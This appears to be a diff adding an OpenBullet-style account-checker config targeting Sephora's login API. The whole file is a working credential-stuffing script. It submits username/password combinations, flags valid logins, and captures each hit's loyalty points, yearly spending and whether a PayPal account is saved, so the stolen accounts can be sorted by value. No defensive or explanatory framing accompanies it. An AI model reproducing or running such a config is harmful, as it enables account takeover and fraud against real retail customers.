@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "Sephora_",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-20T15:20:13.8078609+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.sephora.com/api/auth/login" AutoRedirect=TRUE 
+  CONTENT "{\"login\":\"<USER>\",\"password\":\"<PASS>\",\"loginForCheckout\":true,\"isKeepSignedIn\":false}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  COOKIE "current_country: US" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER ": authority: www.sephora.com" 
+  HEADER ": method: POST" 
+  HEADER ": path: /api/auth/login" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US;q=0.8,en;q=0.7" 
+  HEADER "referer: https://www.sephora.com/profile/me" 
+KEYCHECK BanOn4XX=TRUE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "promotionPoints" 
+  KEYCHAIN Failure OR 
+    KEY "invalidLogin" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "promotionPoints\":0" 
+#promotionPoints PARSE "<SOURCE>" JSON "promotionPoints" Recursive=FALSE -> CAP "promotionPoints" "" "" 
+#vibSpendingForYear PARSE "<SOURCE>" JSON "vibSpendingForYear" Recursive=FALSE -> CAP "vibSpendingForYear" "" "" 
+#hasSavedPaypal PARSE "<SOURCE>" JSON "hasSavedPaypal" Recursive=FALSE -> CAP "hasSavedPaypal" "" "" 
+#isBuyNowAccepted PARSE "<SOURCE>" JSON "isBuyNowAccepted" Recursive=FALSE -> VAR "isBuyNowAccepted" "" "" 
